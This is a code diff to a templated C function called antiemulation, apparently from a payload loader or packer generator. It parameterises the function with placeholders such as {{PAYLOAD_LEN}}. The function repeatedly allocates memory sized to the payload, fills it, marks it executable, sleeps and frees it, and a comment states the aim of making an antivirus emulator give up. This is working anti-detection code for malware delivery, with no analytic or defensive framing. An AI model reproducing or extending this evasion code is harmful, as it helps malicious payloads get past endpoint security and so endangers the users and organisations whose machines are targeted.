@@ -1,8 +1,12 @@
 
-#define ALLOC_NUM 256
+
+#define SIR_ITERATION_COUNT {{SIR_ITERATION_COUNT}}
+#define SIR_ALLOC_COUNT {{SIR_ALLOC_COUNT}}
+
+#define SIR_SLEEP_TIME 200  // ms
 
 
-/* This will allocate ALLOC_NUM RW memory regions, 
+/* This will allocate SIR_ALLOC_COUNT RW memory regions, 
      set them to RX, and free them 
 
     The idea is that the AV emulator will probably give up, either because
@@ -14,24 +18,35 @@
 */
 
 void antiemulation() {
-    void* allocs[ALLOC_NUM];
+    void* allocs[SIR_ALLOC_COUNT];
     DWORD result;
 
-    for(int i=0; i<4; i++) {
-        
-        for(int n=0; n<ALLOC_NUM; n++) {
+    for(int i=0; i<SIR_ITERATION_COUNT; i++) {
+        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
             allocs[n] = VirtualAlloc(
                 NULL, 
-                0x1000, 
+                {{PAYLOAD_LEN}}, 
                 0x3000, 
                 p_RW
             );
+            char *ptr = allocs[n];
+
+            // write every byte of it
+            for(int i=0; i<{{PAYLOAD_LEN}}; i++) {
+                ptr[i] = 0x23;
+            }
         }
 
-        for(int n=0; n<ALLOC_NUM; n++) {
+        // Write something. 
+        /*for(int n=0; n<SIR_ALLOC_COUNT; n++) {
+            char *alloc = allocs[n];
+            alloc[0] = 0; // overwrite the first byte
+        }*/
+
+        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
             if (VirtualProtect(
                 allocs[n], 
-                1000, 
+                {{PAYLOAD_LEN}}, 
                 p_RX, 
                 &result) == 0) 
             {
@@ -39,13 +54,13 @@ void antiemulation() {
             }
         }
 
-        Sleep(200);
+        Sleep(SIR_SLEEP_TIME);
 
         BOOL bSuccess;
-        for(int n=0; n<ALLOC_NUM; n++) {
+        for(int n=0; n<SIR_ALLOC_COUNT; n++) {
             bSuccess = VirtualFree(
                             allocs[n],
-                            1000,
+                            {{PAYLOAD_LEN}},
                             0x00008000); // MEM_RELEASE
         }
     }
